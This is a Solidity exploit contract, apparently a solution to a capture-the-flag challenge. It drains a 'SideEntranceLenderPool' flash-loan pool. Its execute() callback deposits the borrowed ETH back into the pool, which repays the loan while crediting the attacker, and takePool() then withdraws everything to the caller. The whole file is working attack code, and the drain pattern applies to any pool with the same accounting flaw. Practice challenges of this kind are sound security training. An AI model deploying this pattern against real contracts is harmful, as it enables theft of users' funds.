// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "../side-entrance/SideEntranceLenderPool.sol";

contract SelpAttacker {
    using Address for address payable;

    receive() external payable {}

    function execute() external payable {
        SideEntranceLenderPool selp = SideEntranceLenderPool(msg.sender);
        selp.deposit{value: address(this).balance}();
    }

    function takePool(address poolAddress, uint256 amount) public payable {
        SideEntranceLenderPool selp = SideEntranceLenderPool(poolAddress);
        selp.flashLoan(amount);
        selp.withdraw();
        payable(msg.sender).sendValue(amount);
    }
}
